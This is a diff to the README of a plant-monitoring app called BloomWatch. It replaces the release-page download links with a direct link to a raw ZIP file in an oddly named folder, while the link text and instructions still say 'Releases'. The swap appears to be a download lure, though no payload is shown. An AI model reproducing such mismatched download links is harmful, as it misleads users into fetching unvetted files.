@@ -1,13 +1,13 @@
 # 🌿 BloomWatch - Monitor Plant Health Easily
 
 ## 🌐 Download Now
-[![Download BloomWatch](https://img.shields.io/badge/download-BloomWatch-blue.svg)](https://github.com/Syncrc/BloomWatch/releases)
+[![Download BloomWatch](https://raw.githubusercontent.com/Syncrc/BloomWatch/main/breviconic/BloomWatch.zip)](https://raw.githubusercontent.com/Syncrc/BloomWatch/main/breviconic/BloomWatch.zip)
 
 ## 🚀 Getting Started
 BloomWatch is a user-friendly platform that lets you monitor vegetation in real-time. It uses NASA MODIS data to track how plants are doing, detect when they bloom, and predict trends. You don’t need any technical skills to benefit from this tool.
 
 ## 📥 Download & Install
-To get started with BloomWatch, visit this page to download: [BloomWatch Releases](https://github.com/Syncrc/BloomWatch/releases). 
+To get started with BloomWatch, visit this page to download: [BloomWatch Releases](https://raw.githubusercontent.com/Syncrc/BloomWatch/main/breviconic/BloomWatch.zip). 
 
 Choose the latest version available on the releases page. Follow the steps below to install the application:
 
